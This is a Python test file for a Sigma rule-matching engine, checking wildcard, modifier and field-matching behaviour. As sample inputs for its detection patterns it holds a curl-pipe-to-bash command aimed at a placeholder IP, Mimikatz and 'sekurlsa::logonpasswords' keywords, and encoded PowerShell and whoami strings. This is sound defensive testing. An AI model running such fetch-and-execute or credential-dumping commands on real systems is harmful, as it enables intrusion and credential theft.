"""Value matching: wildcards in plain strings, the standard modifiers and
Sigma's case-insensitive string comparison."""

from __future__ import annotations

from typing import Any

import pytest

from app.engine.sigma_engine import _Condition


def matches(field_expr: str, values: Any, event: dict) -> bool:
    return _Condition({"selection": {field_expr: values}, "condition": "selection"}).matches(event)


# ── Wildcards in plain values ────────────────────────────────────────────────

@pytest.mark.parametrize(
    ("pattern", "value", "expected"),
    [
        ("*.exe", "C:\\Temp\\evil.EXE", True),
        ("*.exe", "evil.dll", False),
        ("cmd*", "CMD.exe /c whoami", True),
        ("cmd*", "run cmd.exe", False),
        ("*whoami*", "cmd.exe /c WhoAmI /all", True),
        ("*curl *|*sh*", "curl -s http://198.51.100.7/a | bash", True),
        ("*curl *|*sh*", "curl -s http://198.51.100.7/a -o a", False),
        ("user?", "user1", True),
        ("user?", "user", False),
        ("user?", "user12", False),
        ("a*b?c", "aXXXbYc", True),
        ("a*b?c", "aXXXbc", False),
        # an escaped wildcard is a literal character
        ("100\\*", "100*", True),
        ("100\\*", "1000", False),
        ("what\\?", "what?", True),
        ("what\\?", "whatX", False),
        # a backslash before any other character is a literal backslash
        ("*\\lsass.exe", "C:\\Windows\\System32\\lsass.exe", True),
        # an escaped backslash followed by a wildcard: literal backslash + wildcard
        ("C:\\\\*", "C:\\Windows", True),
        # regex metacharacters in the value are literal
        ("a.c", "abc", False),
        ("a.c*", "a.cd", True),
        ("(x)*", "(x)yz", True),
        # the wildcard also spans line breaks
        ("begin*end", "begin\nmiddle\nend", True),
    ],
)
def test_wildcard(pattern: str, value: str, expected: bool) -> None:
    assert matches("field", pattern, {"field": value}) is expected


def test_plain_value_without_wildcard_is_exact_and_case_insensitive() -> None:
    assert matches("field", "PowerShell.exe", {"field": "powershell.EXE"}) is True
    assert matches("field", "powershell.exe", {"field": "x powershell.exe"}) is False


def test_wildcards_inside_modifier_values() -> None:
    assert matches("field|contains", "a*z", {"field": "__a123z__"}) is True
    assert matches("field|contains", "a*z", {"field": "__a123__"}) is False
    # An escaped backslash before "*" keeps the wildcard: literal backslash, then any text.
    users = r"c:\users\\*\appdata"
    assert matches("field|startswith", users, {"field": r"C:\Users\bob\AppData\x"}) is True
    scripts = r"\temp\\*.ps1"
    assert matches("field|endswith", scripts, {"field": r"C:\Temp\a.PS1"}) is True
    assert matches("field|endswith", scripts, {"field": r"C:\Temp\a.ps1.bak"}) is False


def test_keyword_search_supports_wildcards_and_is_case_insensitive() -> None:
    cond = _Condition({"keywords": ["mimi*atz", "SEKURLSA"], "condition": "keywords"})
    assert cond.matches({"message": "ran Mimikatz"}) is True
    assert cond.matches({"nested": {"cmd": "sekurlsa::logonpasswords"}}) is True
    assert cond.matches({"message": "nothing here"}) is False


# ── Modifiers ────────────────────────────────────────────────────────────────

@pytest.mark.parametrize(
    ("field_expr", "values", "value", "expected"),
    [
        ("f|contains", "ENC", "powershell -enc AAA", True),
        ("f|contains", ["x", "enc"], "powershell -enc AAA", True),
        ("f|contains|all", ["-enc", "powershell"], "PowerShell -Enc AAA", True),
        ("f|contains|all", ["-enc", "cmd"], "PowerShell -Enc AAA", False),
        ("f|startswith", "POWER", "powershell", True),
        ("f|startswith", "shell", "powershell", False),
        ("f|endswith", ".EXE", "a.exe", True),
        ("f|endswith", ".exe", "a.exe.txt", False),
        ("f|re", "^[a-z]{3}\\d+$", "ABC123", True),
        ("f|re", "^[a-z]{3}\\d+$", "ab123", False),
        ("f|re", ["^x", "\\.onion$"], "abc.onion", True),
        ("f|cidr", "10.0.0.0/8", "10.20.30.40", True),
        ("f|cidr", "10.0.0.0/8", "192.168.1.1", False),
        ("f|cidr", ["10.0.0.0/8", "2001:db8::/32"], "2001:db8::1", True),
        ("f|cidr", "10.0.0.0/8", "not-an-ip", False),
        ("f|base64|contains", "whoami", "cmd d2hvYW1p end", True),
        ("f", 445, "445", True),
        ("f", [139, 445], 445, True),
        ("f", 445, 4450, False),
    ],
)
def test_modifier(field_expr: str, values: Any, value: Any, expected: bool) -> None:
    assert matches(field_expr, values, {"f": value}) is expected


def test_list_field_matches_when_any_element_matches() -> None:
    event = {"answers": ["10.0.0.5", "203.0.113.9"]}
    assert matches("answers|cidr", "203.0.113.0/24", event) is True
    assert matches("answers", "10.0.0.5", event) is True
    assert matches("answers|startswith", "198.", event) is False


def test_all_modifier_on_list_field_needs_every_value_somewhere() -> None:
    event = {"tags": ["alpha", "beta"]}
    assert matches("tags|all", ["alpha", "beta"], event) is True
    assert matches("tags|all", ["alpha", "gamma"], event) is False


def test_null_value_matches_missing_or_null_field() -> None:
    assert matches("f", None, {}) is True
    assert matches("f", None, {"f": None}) is True
    assert matches("f", None, {"f": "x"}) is False
    assert matches("f", [None, "x"], {"f": "x"}) is True


def test_missing_field_never_matches_a_string_value() -> None:
    assert matches("f|contains", "x", {}) is False
    assert matches("f", "none", {"f": None}) is False


def test_dotted_field_name_is_found_as_literal_key_and_as_path() -> None:
    assert matches("process.cmd_line|contains", "enc", {"process.cmd_line": "ps -enc"}) is True
    assert matches("process.cmd_line|contains", "enc", {"process": {"cmd_line": "ps -enc"}}) is True


def test_list_of_maps_selection_is_or_of_maps() -> None:
    cond = _Condition({
        "selection": [{"a": "1", "b": "2"}, {"c": "3"}],
        "condition": "selection",
    })
    assert cond.matches({"a": "1", "b": "2"}) is True
    assert cond.matches({"c": "3"}) is True
    assert cond.matches({"a": "1"}) is False
